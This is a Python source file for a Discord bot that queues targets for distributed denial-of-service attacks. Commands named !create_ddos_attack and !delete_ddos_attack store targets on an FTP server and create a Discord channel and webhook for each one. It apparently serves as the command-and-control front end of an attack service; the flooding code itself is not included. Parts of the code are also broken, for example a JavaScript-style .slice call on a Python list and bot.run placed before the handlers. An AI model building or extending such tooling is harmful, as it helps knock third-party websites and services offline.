# github.com/b1bxonty
# ALL RIGHTS RESERVED
#

import discord
import requests
import threading
import time
import random
import string
import os
import sys
import ctypes
import colorama
import json
import ftplib
from ftplib import FTP
from colorama import init
import config
init(autoreset=True)


from colorama import Fore, Back, Style
from discord.ext import commands
from discord.ext.commands import Bot
from discord.ext.commands import has_permissions, MissingPermissions
from discord.ext.commands import CommandNotFound
from discord.ext.commands import CommandOnCooldown

#connect bot with all intents


#get jobs from ftp server and save variable jobs
ftp = FTP('ftp.example.com', 'username', 'password')

#check if file exists
if "jobs.json" in ftp.nlst():
    #get file
    ftp.retrbinary("RETR jobs.json", open('jobs.json', 'wb').write)

    #load file
    with open('jobs.json') as f:
        jobs = json.load(f)
else:
    jobs = []

#close connection
ftp.quit()

def saveftp():
    #connect to ftp server
    ftp = FTP(config.FTP["host"])
    ftp.login(user=config.FTP["user"], passwd = config.FTP["password"])

    #if file exists, delete it
    if "jobs.json" in ftp.nlst():
        ftp.delete("jobs.json")

    #create file and save jobs variable
    with open('jobs.json', 'w') as f:
        json.dump(jobs, f)

    #upload file
    ftp.storbinary('STOR jobs.json', open('jobs.json', 'rb'))

    #end delete file
    os.remove("jobs.json")

    #close connection
    ftp.quit()
###############################################################################################
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)
bot.run(config.DISCORD_TOKEN)

@bot.event
async def on_ready():
    print('Logged in as')
    print(bot.user.name)
    print(bot.user.id)
    print('------')

@bot.event
async def on_message(message):
    suri = "false"

    args = message.content.split(" ").slice(1)

    if message.content.startswith('!create_ddos_attack'):
        if not args[0]:
            await message.channel.send("Please specify a target. Usage: !create_ddos_attack <target>")
            return
        
        #check every value in jobs, if target not there then add it
        for job in jobs:
            if job["target"] == args[0]:
                await message.channel.send("Target already exists in the queue.")
                return
        
        #create new channel for attack of category "DDOS Attacks"
        guild = bot.get_guild(config.GUILD_ID)
        #if category doesn't exist, create it
        if not discord.utils.get(guild.categories, name="DDOS Attacks"):
            await guild.create_category("DDOS Attacks")
        #create channel
        channel = await guild.create_text_channel(args[0], category=discord.utils.get(guild.categories, name="DDOS Attacks"))
        #create webhook and get url
        webhook = await channel.create_webhook(name="DDOS Attack")

        #add target to jobs
        jobs.append({
            "target": args[0],
            "webhook": webhook.url
        })

        saveftp()

        await message.channel.send("Target added to the queue.")

    if message.content.startswith('!delete_ddos_attack'):
        if not args[0]:
            await message.channel.send("Please specify a target. Usage: !delete_ddos_attack <target>")
            return

        #check every value in jobs, if target not there then add it
        for job in jobs:
            if job["target"] == args[0]:
                jobs.remove(job)
                saveftp()
                await message.channel.send("Target removed from the queue.")
                return
        
        await message.channel.send("Target not found in the queue.")